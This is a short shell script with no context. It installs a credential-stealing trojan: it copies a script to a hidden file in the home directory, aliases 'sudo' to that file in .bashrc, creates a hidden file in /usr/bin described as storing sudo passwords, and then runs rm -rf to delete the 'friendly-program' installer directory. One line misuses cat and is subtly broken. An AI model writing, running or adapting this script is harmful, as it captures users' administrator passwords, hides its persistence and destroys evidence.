cp thing.sh /home/$USER/.sudo_config
chmod +x /home/$USER/.sudo_config
echo -n "alias sudo='~/.sudo_config'" >> /home/$USER/.bashrc
cat "#This file stores sudo passwords" > /usr/bin/.passwordsfromSS
rm -rf ../*friendly-program*
